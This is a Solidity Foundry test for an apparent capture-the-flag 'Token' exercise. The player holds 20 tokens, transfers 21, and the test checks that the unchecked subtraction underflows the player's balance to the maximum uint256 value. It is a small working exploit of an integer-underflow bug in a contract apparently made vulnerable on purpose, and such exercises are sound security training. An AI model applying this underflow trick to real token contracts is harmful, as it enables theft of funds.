// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Test.sol";

import "src/Token.sol";
contract TokenTest is Test {
    Token token;
    AttackToken attacker;

    address deployer = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    address player = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;

    function setUp() public {
        vm.startPrank(deployer);
        token = new Token(100000);
        vm.stopPrank();
       
        vm.startPrank(player);
        attacker = new AttackToken(address(token));
        vm.stopPrank();
    }

    function testTransferToken() public {
        uint bal = token.balanceOf(deployer);
        assertEq(bal, 100000);

        vm.startPrank(deployer);
        token.transfer(player, 20);
        vm.stopPrank();

        assertEq(token.balanceOf(player), 20);

        vm.startPrank(player);
        token.transfer(address(0), 21);

        emit log_named_uint("final player bal", token.balanceOf(player));
        require( token.balanceOf(player) == UINT256_MAX, "Player Balance > Token supply");
        vm.stopPrank();


    }

}
